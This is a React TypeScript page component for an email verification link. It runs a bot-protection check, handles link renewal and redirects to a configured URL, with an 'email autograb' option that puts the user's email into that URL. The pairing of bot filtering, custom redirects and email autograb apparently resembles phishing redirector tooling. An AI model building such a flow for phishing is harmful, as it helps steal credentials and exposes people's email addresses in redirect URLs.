import { useEffect, useState } from "react";
import { useRoute } from "wouter";
import { useQuery } from "@tanstack/react-query";
import VerificationProcess from "@/components/VerificationProcess";
import { Settings } from "@/lib/types";
import { apiRequest } from "@/lib/queryClient";

// Define the verification response type for reuse
interface VerificationResponse {
  botProtectionRequired: boolean;
  settings: Settings;
  email: string;
  success: boolean;
  redirectUrl?: string; // Custom redirect URL from the verification link
}

export default function Verification() {
  const [, params] = useRoute("/verify/:code");
  const verificationCode = params?.code;
  const [verificationState, setVerificationState] = useState<'loading' | 'success' | 'error' | 'bot-check'>('loading');
  const [errorMessage, setErrorMessage] = useState<string>("");
  const [settings, setSettings] = useState<Settings | null>(null);
  const [userEmail, setUserEmail] = useState<string>("");
  const [verificationError, setVerificationError] = useState<any>(null);
  
  const { data, isLoading, error, refetch } = useQuery({
    queryKey: [`/api/verification/verify/${verificationCode}`],
    enabled: !!verificationCode,
    staleTime: 0,
  });
  
  // Function to handle renewal request
  const handleRenewalRequest = async (): Promise<boolean> => {
    if (!verificationCode || !userEmail) {
      console.error("Cannot request renewal: missing code or email");
      return false;
    }

    try {
      const response = await apiRequest(
        "POST", 
        "/api/verification/renew", 
        { 
          code: verificationCode,
          email: userEmail 
        }
      );
      
      if (response.ok) {
        return true;
      } else {
        const errorData = await response.json();
        throw new Error(errorData.message || "Failed to renew verification link");
      }
    } catch (err) {
      console.error("Link renewal error:", err);
      return false;
    }
  };

  // Function to handle bot protection check completion
  const handleBotCheckComplete = async () => {
    try {
      // Call API with bot check flag
      const response = await apiRequest("GET", `/api/verification/verify/${verificationCode}?botcheck=passed`);
      const result = await response.json();
      
      // Validate response format
      if (isVerificationResponse(result)) {
        setVerificationState('success');
        setSettings(result.settings);
        setUserEmail(result.email || "");
        
        // Handle redirection
        handleRedirect(result);
      } else {
        throw new Error("Invalid response format from server");
      }
    } catch (err) {
      setVerificationState('error');
      const errMessage = err instanceof Error ? err.message : "Verification failed";
      setErrorMessage(errMessage);
      console.error("Bot check verification error:", err);
    }
  };
  
  // Type guard to validate verification response
  const isVerificationResponse = (obj: any): obj is VerificationResponse => {
    return obj && typeof obj === 'object' && 
      'botProtectionRequired' in obj && 
      'settings' in obj && 
      'email' in obj &&
      'success' in obj;
  };
  
  // Handle redirection after successful verification
  const handleRedirect = (data: any) => {
    // Use the type guard to check the response
    if (!isVerificationResponse(data)) {
      console.error("Invalid data format for redirect:", data);
      return;
    }
    
    const { settings, email, redirectUrl } = data;
    
    // First check for link-specific redirectUrl, then fall back to settings
    if (!redirectUrl && (!settings || !settings.redirectUrl)) {
      console.warn("No redirect URL configured in settings or verification link");
      return;
    }
    
    // Calculate redirect timeout based on settings
    const redirectTimeout = settings?.showLoadingSpinner && settings?.loadingDuration
      ? (settings.loadingDuration * 1000) 
      : 1000;
    
    setTimeout(() => {
      // Determine which URL to use, prioritizing:
      // 1. Custom thank you page if enabled
      // 2. Link-specific redirect URL if available
      // 3. Global settings redirect URL as fallback
      let finalUrl = settings?.useCustomThankYouPage && settings?.customThankYouPage
        ? settings.customThankYouPage
        : redirectUrl || settings?.redirectUrl;
      
      // Handle email autograb feature if configured
      if (settings.useEmailAutograb && email && settings.emailAutograbParam) {
        const paramName = settings.emailAutograbParam;
        
        // Check if we should replace a placeholder or append as query param
        const placeholder = `{${paramName}}`;
        if (finalUrl.includes(placeholder)) {
          // Replace placeholder in URL
          finalUrl = finalUrl.replace(placeholder, encodeURIComponent(email));
        } else {
          // Append as query parameter
          const separator = finalUrl.includes('?') ? '&' : '?';
          finalUrl = `${finalUrl}${separator}${paramName}=${encodeURIComponent(email)}`;
        }
      }
      
      // Redirect to final URL
      console.log(`Redirecting to: ${finalUrl}`);
      window.location.href = finalUrl;
    }, redirectTimeout);
  };
  
  useEffect(() => {
    if (isLoading) {
      setVerificationState('loading');
    } else if (error) {
      setVerificationState('error');
      const errMessage = error instanceof Error ? error.message : "Verification failed";
      setErrorMessage(errMessage);
    } else if (data) {
      // Ensure the response has the expected format using our common type guard
      if (isVerificationResponse(data)) {
        // Check if bot protection is required
        if (data.botProtectionRequired) {
          setVerificationState('bot-check');
          setSettings(data.settings);
          setUserEmail(data.email || "");
        } else {
          setVerificationState('success');
          setSettings(data.settings);
          setUserEmail(data.email || "");
          
          // Handle redirection
          handleRedirect(data);
        }
      } else {
        // Handle unexpected response format
        setVerificationState('error');
        setErrorMessage("Invalid verification response from server");
        console.error("Unexpected verification response format:", data);
      }
    }
  }, [data, isLoading, error]);
  
  useEffect(() => {
    // Store error information for renewal process when verification fails
    if (error) {
      setVerificationError(error);
    }
  }, [error]);

  return (
    <VerificationProcess 
      state={verificationState} 
      errorMessage={errorMessage}
      settings={settings}
      email={userEmail}
      onBotCheckComplete={handleBotCheckComplete}
      onRenewRequest={handleRenewalRequest}
    />
  );
}
